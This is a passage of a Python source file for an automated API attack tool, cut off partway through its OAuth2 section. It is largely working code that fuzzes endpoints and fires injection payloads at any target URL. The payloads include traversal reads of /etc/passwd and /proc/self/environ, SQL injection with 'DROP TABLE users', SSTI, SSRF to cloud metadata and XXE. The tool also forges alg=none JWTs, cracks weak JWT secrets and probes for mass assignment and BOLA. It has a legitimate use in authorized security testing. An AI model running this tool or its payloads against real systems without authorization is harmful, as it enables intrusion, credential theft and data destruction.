#!/usr/bin/env python3
"""
api_re.py — API Reverse Engineering Tool

Autonomously reverse engineers unknown HTTP APIs by:
  1. Discovery: path fuzzing, method fuzzing, OpenAPI harvesting
  2. Schema extraction: parameter types, required vs optional, defaults
  3. Behavior mapping: input→output, error classification, state changes
  4. Secret extraction: error messages, stack traces, headers, timing
  5. Vuln surface mapping: injection points, file paths, deserialization

Techniques grounded in:
  - OWASP API Security Top 10 (BOLA, mass assignment, SSRF, broken auth)
  - JWT attack surface (alg=none, algorithm confusion, kid injection, jku SSRF)
  - Parameter-layer attacks (pollution, verb tampering, content-type switching)
  - GraphQL introspection, batching, alias flooding, depth attacks
  - IDOR/BOLA object enumeration
  - OAuth2/OIDC: redirect_uri manipulation, token substitution, scope escalation, PKCE downgrade
  - gRPC: server reflection, service enumeration, gRPC-Web detection
  - SOAP/WSDL: endpoint discovery, XXE in SOAP body
  - JSON-RPC: system.listMethods, batch execution
  - Business logic: numeric boundary, sequence breaking, price manipulation
  - Rate limit bypass: IP header spoofing, path variation, encoding evasion
  - Webhook SSRF: cloud metadata, internal service pivot
  - Credential reuse: default creds against auth endpoints

Usage:
  python api_re.py http://target:port
  python api_re.py http://target:port --depth deep
  python api_re.py http://target:port --focus injection
  python api_re.py http://target:port --fuzz-params /control
  python api_re.py http://target:port --focus jwt
  python api_re.py http://target:port --focus bola
  python api_re.py http://target:port --focus oauth2
  python api_re.py http://target:port --focus grpc
  python api_re.py http://target:port --focus soap
"""

import requests
import sys
import json
import re
import base64
import time
import itertools
import string
import hashlib
import hmac
from urllib.parse import urljoin, urlparse, urlencode, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from typing import Optional

# ─── Data Models ─────────────────────────────────────────────────────────────

@dataclass
class Endpoint:
    path: str
    methods: list = field(default_factory=list)
    params: dict = field(default_factory=dict)  # {name: {type, default, required}}
    responses: dict = field(default_factory=dict)  # {status: {content_type, body_sample}}
    notes: list = field(default_factory=list)
    vuln_signals: list = field(default_factory=list)


@dataclass
class APIMap:
    base_url: str
    openapi: Optional[dict] = None
    endpoints: list = field(default_factory=list)
    headers: dict = field(default_factory=dict)
    auth_required: bool = False
    framework: Optional[str] = None
    version: Optional[str] = None
    notes: list = field(default_factory=list)
    findings: list = field(default_factory=list)


# ─── Core HTTP helpers ────────────────────────────────────────────────────────

SESSION = requests.Session()
SESSION.headers.update({"User-Agent": "Mozilla/5.0 (compatible; api-re/1.0)"})
TIMEOUT = 10
VERBOSE = False


def get(url, **kw):
    try:
        return SESSION.get(url, timeout=TIMEOUT, **kw)
    except Exception:
        return None


def post(url, **kw):
    try:
        return SESSION.post(url, timeout=TIMEOUT, **kw)
    except Exception:
        return None


def req(method, url, **kw):
    try:
        return SESSION.request(method, url, timeout=TIMEOUT, **kw)
    except Exception:
        return None


import io
import threading

_stdout_lock = threading.Lock()


def _run_phase_captured(fn, args):
    """Run fn(*args), capturing stdout. Returns (result, captured_str)."""
    buf = io.StringIO()
    old = sys.stdout
    sys.stdout = buf
    try:
        result = fn(*args)
    finally:
        sys.stdout = old
    return result, buf.getvalue()


def _dedup_findings(findings):
    """Deduplicate findings by (type, endpoint/path, param). Keeps first occurrence."""
    seen = set()
    out = []
    for f in findings:
        key = (
            f.get("type"),
            f.get("endpoint") or f.get("path"),
            f.get("param"),
        )
        if key not in seen:
            seen.add(key)
            out.append(f)
    return out


# ─── Phase 1: Framework Detection ────────────────────────────────────────────

FRAMEWORK_SIGNALS = {
    "FastAPI": ["/docs", "/openapi.json", "/redoc"],
    "Flask": ["/", "/_debug_toolbar"],
    "Django": ["/admin/", "/api/schema/"],
    "Express": ["/api", "/health"],
    "Gradio": ["/config", "/info", "/queue/status"],
    "Uvicorn": [],  # via Server header
}


def detect_framework(base):
    """Detect framework via headers and known paths."""
    signals = {}
    r = get(base + "/")
    if r:
        server = r.headers.get("server", "")
        if "uvicorn" in server.lower():
            signals["Uvicorn/FastAPI"] = 0.9
        elif "gunicorn" in server.lower():
            signals["Gunicorn/Flask"] = 0.7
        elif "nginx" in server.lower():
            signals["Nginx (reverse proxy)"] = 0.5
        # Fingerprint via CORS and other headers
        if r.headers.get("x-powered-by"):
            signals[f"XPoweredBy:{r.headers['x-powered-by']}"] = 0.8
        if r.headers.get("x-frame-options"):
            signals["django-or-flask"] = 0.4

    for path in ["/openapi.json", "/docs", "/redoc"]:
        r = get(base + path)
        if r and r.status_code < 400:
            signals["FastAPI"] = 0.95
            break

    for path in ["/config", "/queue/status"]:
        r = get(base + path)
        if r and r.status_code < 400 and "gradio" in r.text.lower():
            signals["Gradio"] = 0.95

    # GraphQL detection
    for path in ["/graphql", "/api/graphql", "/gql", "/query"]:
        r = get(base + path)
        if r and "graphql" in r.text.lower():
            signals["GraphQL"] = 0.9
            break

    return signals


# ─── Phase 2: OpenAPI / Schema Harvesting ─────────────────────────────────────

OPENAPI_PATHS = [
    "/openapi.json", "/openapi.yaml",
    "/swagger.json", "/swagger.yaml",
    "/api/openapi.json", "/api/swagger.json",
    "/v1/openapi.json", "/v2/openapi.json", "/v3/openapi.json",
    "/docs/openapi.json",
    "/api-docs", "/api-docs.json",
    "/api/schema/", "/_schema/",
    "/.well-known/openapi.json",
    "/api/spec", "/spec.json",
]


def harvest_openapi(base):
    """Try to fetch OpenAPI spec from standard paths."""
    for path in OPENAPI_PATHS:
        r = get(base + path)
        if r and r.status_code == 200:
            try:
                data = r.json()
                if "paths" in data or "openapi" in data or "swagger" in data:
                    return data
            except Exception:
                pass
    return None


def parse_openapi(spec):
    """Extract endpoint map from OpenAPI spec."""
    endpoints = []
    for path, methods in spec.get("paths", {}).items():
        for method, op in methods.items():
            if method in ("get", "post", "put", "patch", "delete"):
                ep = Endpoint(path=path, methods=[method.upper()])
                for param in op.get("parameters", []):
                    ep.params[param["name"]] = {
                        "location": param.get("in"),
                        "required": param.get("required", False),
                        "schema": param.get("schema", {}),
                    }
                if "requestBody" in op:
                    content = op["requestBody"].get("content", {})
                    for ct, schema_wrap in content.items():
                        schema = schema_wrap.get("schema", {})
                        ep.params["__body__"] = {"content_type": ct, "schema": schema}
                endpoints.append(ep)
    return endpoints


# ─── Phase 3: Path Discovery ───────────────────────────────────────────────────

PATH_WORDLIST = [
    # Health / meta
    "", "health", "healthz", "ping", "status", "version", "info",
    "metrics", "debug", "ready", "alive",
    # API versioning (OWASP API9: Improper Inventory)
    "api", "api/v1", "api/v2", "api/v3", "api/v4",
    "v1", "v2", "v3", "v4",
    "api/v1/health", "api/v2/health",
    # Auth
    "login", "logout", "auth", "token", "oauth", "oauth2",
    "admin", "user", "users", "me", "profile",
    "refresh", "revoke", "introspect",
    # Common operations
    "upload", "download", "file", "files", "export", "import",
    "config", "settings", "schema",
    # Docs
    "docs", "redoc", "openapi.json", "swagger", "swagger-ui.html",
    # TTS-specific
    "tts", "voice", "audio", "model", "models", "speaker",
    "synthesize", "synthesis", "infer", "inference",
    "set_model", "change_refer", "control",
    # ML/AI
    "predict", "classify", "embed", "encode", "decode",
    "train", "finetune", "eval",
    # CRUD
    "create", "read", "update", "delete",
    "get", "post", "put", "patch",
    # Storage
    "store", "cache", "save", "load",
    # Gradio
    "queue", "run", "cancel",
    # GraphQL
    "graphql", "gql", "query",
    # Common deprecated/shadow (OWASP API9)
    "api_v1", "api_v2", "_api", "internal", "internal/api",
    "legacy", "old", "beta", "test", "dev",
    "api/internal", "api/admin",
]

EXTENSIONS = ["", ".json", ".xml", ".yaml", ".txt"]


def fuzz_paths(base, wordlist=None, workers=30, methods=("GET", "POST")):
    """Fuzz endpoint paths and return non-404 responses."""
    wl = wordlist or PATH_WORDLIST
    found = {}

    def probe(path, method):
        url = base + "/" + path.lstrip("/")
        r = req(method, url, allow_redirects=False)
        if r and r.status_code not in (404, 405):
            return (path, method, r)
        return None

    checks = [(p, m) for p in wl for m in methods]
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(probe, p, m): (p, m) for p, m in checks}
        for f in as_completed(futures):
            result = f.result()
            if result:
                path, method, r = result
                key = (path, method)
                if key not in found:
                    found[key] = r
                    print(f"  [{method} {r.status_code}] /{path} "
                          f"| {r.headers.get('content-type','?')[:40]} "
                          f"| {len(r.content)}b")

    return found


# ─── Phase 3b: API Version Discovery ─────────────────────────────────────────

def discover_versions(base):
    """
    Probe versioned API paths. Returns dict of version → {path, status, body_sample}.
    Grounded in OWASP API9: Improper Inventory Management — deprecated API
    versions often lack hardening applied to current versions.
    """
    version_patterns = [
        "/v{n}", "/api/v{n}", "/api/{n}", "/{n}.0",
        "/api/v{n}.0", "/v{n}/api", "/rest/v{n}",
    ]
    results = {}
    for n in range(1, 6):
        for pat in version_patterns:
            path = pat.replace("{n}", str(n))
            r = get(base + path)
            if r and r.status_code not in (404, 400, 405):
                print(f"  [VERSION] {path} → {r.status_code} ({len(r.content)}b)")
                results[path] = {"status": r.status_code, "sample": r.text[:100]}
    return results


# ─── Phase 4: Parameter Probing ───────────────────────────────────────────────

INJECTION_PROBES = {
    "path_traversal": [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "/etc/passwd",
        "/proc/self/cmdline",
        "/proc/self/environ",
    ],
    "pickle_rce": [
        "/etc/passwd",
        "/proc/self/maps",
        "/dev/null",
    ],
    "sql_injection": [
        "' OR '1'='1",
        "'; DROP TABLE users;--",
        "1 OR 1=1",
        "1' AND SLEEP(3)--",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config.__class__.__mro__}}",
    ],
    "ssrf": [
        "http://127.0.0.1:80/",
        "http://localhost/",
        "file:///etc/passwd",
        "http://169.254.169.254/latest/meta-data/",
        "http://0.0.0.0:80/",
        "http://[::1]/",
    ],
    "format_string": [
        "%s%s%s",
        "{0.__class__.__mro__}",
        "%x%x%x",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>',
    ],
    "prototype_pollution": [
        '{"__proto__":{"admin":true}}',
        '{"constructor":{"prototype":{"admin":true}}}',
    ],
}


# Signals that confirm a specific probe category actually triggered its vuln class.
# PATH_ACCESS alone means the server tried to open the value as a path — it only
# confirms path_traversal/pickle_rce, not sql/ssti/ssrf/xxe/etc.
CONFIRMING_SIGNALS = {
    "path_traversal":     {"PATH_ACCESS", "FILE_READ"},
    "pickle_rce":         {"PICKLE_DESERIALIZE"},
    "sql_injection":      {"SQL_REFLECT"},
    "ssti":               {"SSTI_EVAL"},
    "ssrf":               {"SSRF_ACTIVE", "SSRF_CLOUD_METADATA"},
    "format_string":      {"SSTI_EVAL", "FORMAT_EVAL"},
    "xxe":                {"FILE_READ", "SSRF_ACTIVE", "SSRF_CLOUD_METADATA"},
    "prototype_pollution": {"PROTO_POLLUTION_REFLECT"},
}


def probe_param(base_url, path, param, method="GET", timeout=10):
    """
    Probe a single parameter with all injection payloads.
    Only reports a category as confirmed when a category-specific signal fires —
    PATH_ACCESS alone does NOT confirm sql_injection / ssti / ssrf / xxe.
    """
    results = {}
    url = base_url + path

    for category, payloads in INJECTION_PROBES.items():
        category_results = []
        for payload in payloads:
            try:
                if method == "GET":
                    r = SESSION.get(url, params={param: payload}, timeout=timeout)
                else:
                    if category in ("xxe", "prototype_pollution"):
                        ct = "application/xml" if category == "xxe" else "application/json"
                        r = SESSION.post(url, data=payload if category == "xxe" else None,
                                         json=json.loads(payload) if category == "prototype_pollution" else None,
                                         headers={"Content-Type": ct}, timeout=timeout)
                    else:
                        r = SESSION.post(url, json={param: payload}, timeout=timeout)

                result = {
                    "payload": payload,
                    "status": r.status_code,
                    "body": r.text[:200],
                    "signals": [],
                }

                body = r.text.lower()
                if "errno" in body or "no such file" in body:
                    result["signals"].append("PATH_ACCESS")
                if "invalid load key" in body or "unpickling" in body or "pickle data" in body:
                    result["signals"].append("PICKLE_DESERIALIZE")
                if any(x in body for x in ("syntax error", "mysql", "ora-", "pg::", "sqlite")):
                    result["signals"].append("SQL_REFLECT")
                if "49" in body and "{{" in payload:
                    result["signals"].append("SSTI_EVAL")
                if "root:" in body or "/bin/bash" in body or "daemon:" in body:
                    result["signals"].append("FILE_READ")
                if "connection refused" in body or "no route to host" in body:
                    result["signals"].append("SSRF_ACTIVE")
                # SSRF_CLOUD_METADATA only counts if metadata content appears WITHOUT
                # a "no such file" error (otherwise the URL just reflected in a path error)
                if ("169.254" in body or "ami-id" in body or "instance-id" in body) \
                        and "no such file" not in body and "errno" not in body:
                    result["signals"].append("SSRF_CLOUD_METADATA")
                if "admin" in body and "proto" in payload.lower() and r.status_code == 200:
                    result["signals"].append("PROTO_POLLUTION_REFLECT")
                if "%" in payload and body != body.replace(payload, "") and "errno" not in body:
                    result["signals"].append("FORMAT_EVAL")

                # Only flag a signal if it's a confirming signal for this category
                confirming = CONFIRMING_SIGNALS.get(category, set())
                confirmed = [s for s in result["signals"] if s in confirming]
                if confirmed:
                    result["confirmed_signals"] = confirmed
                    category_results.append(result)
                    print(f"  [!] {category} CONFIRMED on param={param!r}: {confirmed} | {result['body'][:80]}")
                elif result["signals"] and VERBOSE:
                    print(f"  [~] {category} probe on param={param!r}: signals={result['signals']} (not confirming for {category})")

            except Exception:
                pass

        if category_results:
            results[category] = category_results

    return results


# ─── Phase 4b: Verb Tampering ─────────────────────────────────────────────────

HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD",
                "TRACE", "CONNECT", "PROPFIND", "LOCK", "UNLOCK"]

METHOD_OVERRIDE_HEADERS = [
    "X-HTTP-Method-Override",
    "X-HTTP-Method",
    "X-Method-Override",
    "_method",
]


def probe_verb_tampering(base, endpoints):
    """
    OWASP API5: Broken Function Level Authorization.
    Try all HTTP methods on each endpoint. Some endpoints allow DELETE/PUT
    only for admins — verb tampering bypasses gateways that only check GET/POST.
    Also probe X-HTTP-Method-Override header injection.
    """
    findings = []
    for ep in endpoints[:10]:  # limit to first 10 endpoints
        url = base + ep.path
        baseline = req("GET", url)
        baseline_code = baseline.status_code if baseline else 0

        for method in HTTP_METHODS:
            if method in ep.methods:
                continue
            r = req(method, url)
            if r and r.status_code not in (405, 501, 404, 0):
                if r.status_code != baseline_code:
                    print(f"  [VERB] {method} {ep.path} → {r.status_code} (baseline GET={baseline_code})")
                    findings.append({
                        "endpoint": ep.path,
                        "method": method,
                        "status": r.status_code,
                        "note": f"unexpected {method} response (GET={baseline_code})",
                    })

        # Method override header injection
        for override_header in METHOD_OVERRIDE_HEADERS[:2]:
            for override_method in ["DELETE", "PUT", "PATCH"]:
                r = req("POST", url, headers={override_header: override_method})
                if r and r.status_code not in (405, 404, 501):
                    print(f"  [VERB_OVERRIDE] {override_header}: {override_method} on {ep.path} → {r.status_code}")
                    findings.append({
                        "endpoint": ep.path,
                        "override_header": override_header,
                        "override_method": override_method,
                        "status": r.status_code,
                    })

    return findings


# ─── Phase 4c: Content-Type Switching ────────────────────────────────────────

CONTENT_TYPES = [
    ("application/json",       lambda d: json.dumps(d)),
    ("application/xml",        lambda d: "<root>" + "".join(f"<{k}>{v}</{k}>" for k, v in d.items()) + "</root>"),
    ("application/x-www-form-urlencoded", lambda d: urlencode(d)),
    ("text/plain",             lambda d: str(d)),
    ("multipart/form-data",    None),  # handled separately
]


def probe_content_type_switch(base, endpoints):
    """
    Some APIs validate input differently per content-type.
    A JSON endpoint that doesn't parse XML may reflect raw XML as error →
    XXE or injection surface. Form-encoded params may bypass JSON validators.
    """
    findings = []
    for ep in [e for e in endpoints if "POST" in e.methods or "PUT" in e.methods][:5]:
        url = base + ep.path
        test_data = {"x": "test", "id": "1"}
        for ct, encoder in CONTENT_TYPES[:3]:
            if encoder is None:
                continue
            body = encoder(test_data)
            r = req("POST", url, data=body if ct != "application/json" else None,
                    json=test_data if ct == "application/json" else None,
                    headers={"Content-Type": ct})
            if r and r.status_code not in (415, 404, 0):
                print(f"  [CT_SWITCH] {ct} on {ep.path} → {r.status_code}")
                if "xml" in r.text.lower() or "error" in r.text.lower():
                    findings.append({"endpoint": ep.path, "content_type": ct, "status": r.status_code,
                                     "sample": r.text[:100]})
    return findings


# ─── Phase 4d: Parameter Pollution ───────────────────────────────────────────

def probe_param_pollution(base, endpoints):
    """
    HTTP Parameter Pollution: duplicate params with different values.
    Some parsers use first value, some last, some concatenate.
    Can bypass WAF rules (WAF reads first, app reads last) or
    cause type confusion in strongly-typed backends.
    """
    findings = []
    for ep in endpoints[:8]:
        url = base + ep.path
        for param in list(ep.params.keys())[:3]:
            if param == "__body__":
                continue
            # Duplicate param: legitimate value + injection
            polluted_url = f"{url}?{param}=safe&{param}=' OR 1=1--"
            r = req("GET", polluted_url)
            if r and ("error" in r.text.lower() or "sql" in r.text.lower()):
                print(f"  [PARAM_POLL] Duplicate {param} on {ep.path} → {r.status_code}: {r.text[:80]}")
                findings.append({"endpoint": ep.path, "param": param, "status": r.status_code,
                                  "sample": r.text[:100]})
    return findings


# ─── Phase 4e: Mass Assignment Probe ─────────────────────────────────────────

MASS_ASSIGNMENT_FIELDS = [
    "admin", "is_admin", "role", "superuser", "is_superuser",
    "privilege", "privileges", "group", "groups",
    "verified", "active", "enabled", "account_type",
    "balance", "credits", "score", "rank",
    "permissions", "access_level", "tier",
    "email_verified", "phone_verified",
    "id", "user_id", "account_id",  # ID override
]


def probe_mass_assignment(base, endpoints):
    """
    OWASP API3: Mass Assignment / Broken Object Property Level Authorization.
    Send extra privileged fields in POST/PUT requests.
    If any are reflected in the response, the API has mass assignment.
    If the server accepts is_admin=true, that's authorization bypass.
    """
    findings = []
    for ep in [e for e in endpoints if "POST" in e.methods or "PUT" in e.methods][:5]:
        url = base + ep.path

        # Baseline: normal POST
        baseline = req("POST", url, json={"test": "value"})
        baseline_body = baseline.text if baseline else ""

        # Augmented: with admin fields
        extra = {f: True for f in MASS_ASSIGNMENT_FIELDS[:8]}
        extra["test"] = "value"
        r = req("POST", url, json=extra)
        if r:
            # Check if any privileged field was reflected
            for field in MASS_ASSIGNMENT_FIELDS[:8]:
                if field in r.text and field not in baseline_body:
                    print(f"  [MASS_ASSIGN] Field {field!r} reflected in {ep.path}: {r.text[:100]}")
                    findings.append({"endpoint": ep.path, "reflected_field": field,
                                     "status": r.status_code, "sample": r.text[:150]})
    return findings


# ─── Phase 4f: BOLA / IDOR Probe ─────────────────────────────────────────────

import uuid

IDOR_ID_TYPES = [
    ("integer", [str(i) for i in range(1, 6)] + ["0", "-1", "9999999"]),
    ("uuid", [str(uuid.uuid4()) for _ in range(3)] + ["00000000-0000-0000-0000-000000000000"]),
    ("alphanumeric", ["abc", "test", "admin", "user", "root"]),
]


def probe_bola(base, endpoints):
    """
    OWASP API1: Broken Object Level Authorization.
    Try numeric IDs, UUIDs, and common string IDs in path segments.
    Compare authenticated vs unauthenticated responses.
    Also try ID substitution in query params.
    """
    findings = []
    for ep in endpoints[:8]:
        path = ep.path
        url = base + path

        # Inject IDs into path segments with {placeholder} patterns
        if "{" in path:
            for id_type, ids in IDOR_ID_TYPES:
                for test_id in ids[:3]:
                    test_path = re.sub(r"\{[^}]+\}", test_id, path)
                    r = req("GET", base + test_path)
                    if r and r.status_code == 200 and len(r.content) > 50:
                        print(f"  [BOLA] {test_path} → 200 ({len(r.content)}b) [{id_type} id={test_id}]")
                        findings.append({"path": test_path, "id_type": id_type,
                                          "id": test_id, "size": len(r.content)})

        # Try appending IDs to paths
        for test_id in ["1", "2", "admin", "00000000-0000-0000-0000-000000000001"]:
            r = req("GET", url.rstrip("/") + f"/{test_id}")
            if r and r.status_code == 200 and len(r.content) > 50:
                print(f"  [BOLA] {path}/{test_id} → 200 ({len(r.content)}b)")
                findings.append({"path": f"{path}/{test_id}", "id": test_id,
                                  "size": len(r.content)})

    return findings


# ─── Phase 4g: GraphQL Introspection ─────────────────────────────────────────

GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/gql", "/query", "/v1/graphql", "/graphiql"]

INTROSPECTION_QUERY = {
    "query": """
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields { name type { name kind } }
    }
  }
}
"""
}

MUTATION_PROBE = {
    "query": "mutation { __typename }"
}


def probe_graphql(base):
    """
    Probe for GraphQL endpoints and run introspection.
    Introspection reveals full schema — all types, queries, mutations.
    Disabled introspection can sometimes be bypassed with fragment aliases
    or field suggestion errors.
    """
    findings = []
    for path in GRAPHQL_PATHS:
        r = post(base + path, json=INTROSPECTION_QUERY)
        if r and r.status_code == 200:
            try:
                data = r.json()
                if "data" in data and "__schema" in str(data):
                    print(f"  [GRAPHQL] Introspection enabled at {path}")
                    types = data.get("data", {}).get("__schema", {}).get("types", [])
                    for t in types:
                        if t.get("name") and not t["name"].startswith("__"):
                            fields = [f["name"] for f in (t.get("fields") or [])]
                            if fields:
                                print(f"    Type: {t['name']} → {', '.join(fields[:5])}")
                    findings.append({"path": path, "types": [t.get("name") for t in types[:20]]})

                elif "errors" in data:
                    err = str(data["errors"])
                    # Suggestion errors leak field names even with introspection off
                    if "did you mean" in err.lower() or "suggestion" in err.lower():
                        print(f"  [GRAPHQL_SUGGEST] Field suggestion leakage at {path}: {err[:100]}")
                        findings.append({"path": path, "type": "suggestion_leak", "error": err[:200]})
            except Exception:
                pass

        # Check for mutation capability (state change)
        r2 = post(base + path, json=MUTATION_PROBE)
        if r2 and r2.status_code == 200 and "mutation" in r2.text.lower():
            print(f"  [GRAPHQL_MUTATION] Mutations enabled at {path}")
            findings.append({"path": path, "type": "mutation_enabled"})

    return findings


# ─── Phase 4h: JWT Analysis ───────────────────────────────────────────────────

JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "qwerty", "admin",
    "test", "", "jwt", "token", "key", "api_key",
    "change_me", "your-256-bit-secret", "supersecret",
    "HS256", "HS512", "your-secret-key",
]


def decode_jwt_unsafe(token):
    """Decode JWT without signature verification. Returns (header, payload) or None."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header = json.loads(base64.b64decode(parts[0] + "=="))
        payload = json.loads(base64.b64decode(parts[1] + "=="))
        return header, payload
    except Exception:
        return None


def forge_jwt_alg_none(token):
    """Forge JWT with alg=none (removes signature verification)."""
    result = decode_jwt_unsafe(token)
    if not result:
        return None
    header, payload = result
    header["alg"] = "none"
    new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip("=")
    new_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    return f"{new_header}.{new_payload}."


def crack_jwt_secret(token):
    """Try weak secrets for HS256/HS384/HS512 JWT."""
    result = decode_jwt_unsafe(token)
    if not result:
        return None
    header, _ = result
    alg = header.get("alg", "")
    if not alg.startswith("HS"):
        return None

    hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    h_fn = hash_map.get(alg, hashlib.sha256)
    parts = token.split(".")
    msg = f"{parts[0]}.{parts[1]}".encode()
    sig = base64.urlsafe_b64decode(parts[2] + "==")

    for secret in JWT_WEAK_SECRETS:
        candidate = hmac.new(secret.encode(), msg, h_fn).digest()
        if candidate == sig:
            return secret
    return None


def analyze_tokens_in_response(base, endpoints):
    """
    Extract JWTs from API responses, analyze alg, check for alg=none bypass,
    try weak secret cracking. Also checks for Bearer token patterns in errors.
    OWASP API2: Broken Authentication.
    """
    findings = []
    jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')

    for ep in endpoints[:10]:
        url = base + ep.path
        r = get(url)
        if not r:
            continue
        tokens = jwt_pattern.findall(r.text + str(r.headers))
        for token in tokens[:3]:
            result = decode_jwt_unsafe(token)
            if not result:
                continue
            header, payload = result
            alg = header.get("alg", "?")
            print(f"  [JWT] Found at {ep.path}: alg={alg} | payload_keys={list(payload.keys())}")

            # Check alg=none
            forged = forge_jwt_alg_none(token)
            if forged:
                r2 = get(url, headers={"Authorization": f"Bearer {forged}"})
                if r2 and r2.status_code != 401:
                    print(f"  [JWT_ALG_NONE] alg=none accepted at {ep.path}: {r2.status_code}")
                    findings.append({"endpoint": ep.path, "type": "alg_none_bypass",
                                     "status": r2.status_code})

            # Check weak secret
            secret = crack_jwt_secret(token)
            if secret is not None:
                print(f"  [JWT_WEAK_SECRET] Secret found: {secret!r} at {ep.path}")
                findings.append({"endpoint": ep.path, "type": "weak_jwt_secret",
                                  "secret": secret})

            # Check kid injection (SQLi/path traversal in kid header)
            if "kid" in header:
                kid = header["kid"]
                print(f"  [JWT_KID] kid={kid!r} — potential SQLi/path traversal in key lookup")
                findings.append({"endpoint": ep.path, "type": "jwt_kid_present",
                                  "kid": kid})

            # Check jku/x5u (SSRF via JWK Set URL)
            for ssrf_claim in ("jku", "x5u", "jwks_uri"):
                if ssrf_claim in header:
                    print(f"  [JWT_SSRF] {ssrf_claim}={header[ssrf_claim]!r} — JWK URL SSRF possible")
                    findings.append({"endpoint": ep.path, "type": f"jwt_{ssrf_claim}_ssrf",
                                     "url": header[ssrf_claim]})

            findings.append({"endpoint": ep.path, "type": "jwt_found",
                              "alg": alg, "payload_keys": list(payload.keys())})

    return findings


# ─── Phase 4i: Hidden Parameter Discovery via JS ──────────────────────────────

PARAM_PATTERNS = [
    re.compile(r'"([a-z][a-z0-9_]{2,30})":\s*(?:"[^"]*"|[0-9]+|true|false|null)', re.I),
    re.compile(r"'([a-z][a-z0-9_]{2,30})':\s*(?:'[^']*'|[0-9]+|true|false|null)", re.I),
    re.compile(r'\bparams\[["\']([a-z][a-z0-9_]{2,30})["\']\]', re.I),
    re.compile(r'\bdata\.[a-z][a-z0-9_]{2,30}\b', re.I),
    re.compile(r'(?:query|body|payload)\s*=\s*\{([^}]+)\}', re.I),
]

JS_PATHS = ["/static/js/main.js", "/assets/index.js", "/js/app.js",
            "/static/app.js", "/bundle.js", "/dist/bundle.js",
            "/assets/main.js", "/js/bundle.js"]


def discover_hidden_params(base):
    """
    Extract parameter names from JS bundles and API responses.
    JS bundle analysis reveals undocumented params that the frontend sends
    but the API docs don't expose. These are often unvalidated inputs.
    """
    all_params = set()

    for path in JS_PATHS:
        r = get(base + path)
        if r and r.status_code == 200 and "javascript" in r.headers.get("content-type", ""):
            for pattern in PARAM_PATTERNS:
                matches = pattern.findall(r.text)
                all_params.update(m if isinstance(m, str) else m[0] for m in matches)

    # Also check main page and API responses
    r = get(base + "/")
    if r:
        for pattern in PARAM_PATTERNS:
            all_params.update(pattern.findall(r.text))

    if all_params:
        print(f"  [HIDDEN_PARAMS] Extracted {len(all_params)} param names from JS: {sorted(all_params)[:20]}")

    return sorted(all_params)


# ─── Phase 5: Error Extraction / Information Leakage ─────────────────────────

def extract_info_from_errors(base, endpoints):
    """
    Trigger structured errors to extract stack traces, internal paths,
    config values, and schema information.
    FastAPI pydantic validation errors (422) reveal full param schema.
    """
    findings = []

    for ep in endpoints:
        url = base + ep.path
        for method in ep.methods:
            probes = [
                {},
                {"x": "A" * 1000},
                {"__proto__": {"admin": True}},
                # Type confusion: send string where int expected
                {k: "INVALID_TYPE_XYZ" for k in list(ep.params.keys())[:3] if k != "__body__"},
            ]
            for probe in probes:
                r = req(method, url, json=probe, params=probe if method == "GET" else {})
                if r and r.status_code in (400, 422, 500):
                    body = r.text
                    if "detail" in body:
                        findings.append({
                            "endpoint": f"{method} {ep.path}",
                            "type": "validation_error",
                            "body": body[:300],
                        })
                    if "Traceback" in body or "Error" in body:
                        findings.append({
                            "endpoint": f"{method} {ep.path}",
                            "type": "stack_trace_leak",
                            "body": body[:500],
                        })
                    # Check for path disclosure
                    if "/home/" in body or "/var/" in body or "/usr/" in body or "/root/" in body:
                        findings.append({
                            "endpoint": f"{method} {ep.path}",
                            "type": "path_disclosure",
                            "body": body[:300],
                        })

    return findings


# ─── Phase 6: Behavior Mapping ───────────────────────────────────────────────

def map_state_changes(base, endpoints):
    """
    Detect state changes by probing endpoints multiple times.
    Side-effect-inducing endpoints return different responses on second call.
    """
    state_changing = []
    for ep in endpoints:
        url = base + ep.path
        for method in ep.methods:
            r1 = req(method, url)
            r2 = req(method, url)
            if r1 and r2:
                if r1.text != r2.text:
                    state_changing.append({
                        "endpoint": f"{method} {ep.path}",
                        "note": "non-idempotent: responses differ between calls",
                        "r1": r1.text[:100],
                        "r2": r2.text[:100],
                    })
    return state_changing


# ─── Phase 7: Rate Limiting Probe ────────────────────────────────────────────

def probe_rate_limiting(base, endpoints):
    """
    OWASP API4: Unrestricted Resource Consumption.
    Check if the API rate limits requests. Send 20 rapid requests to each
    endpoint and watch for 429 or slowdown. Absence = DoS surface.
    """
    findings = []
    for ep in endpoints[:3]:
        url = base + ep.path
        codes = []
        start = time.time()
        for _ in range(20):
            r = get(url)
            if r:
                codes.append(r.status_code)
        elapsed = time.time() - start

        if 429 in codes:
            print(f"  [RATE_LIMIT] {ep.path}: rate limited (429 received)")
        else:
            rps = 20 / elapsed
            print(f"  [NO_RATE_LIMIT] {ep.path}: {rps:.1f} req/s, no 429 (DoS surface)")
            findings.append({"endpoint": ep.path, "rps": rps, "codes": list(set(codes))})
    return findings


# ─── Phase 8: OAuth2/OIDC Attack Surface ────────────────────────────────────

OAUTH2_DISCOVERY_PATHS = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/oauth2/.well-known/openid-configuration",
    "/auth/.well-known/openid-configuration",
    "/oauth/authorize",
    "/oauth/token",
    "/oauth2/authorize",
    "/oauth2/token",
    "/connect/authorize",
    "/connect/token",
    "/realms/master/protocol/openid-connect/token",
    "/.well-known/jwks.json",
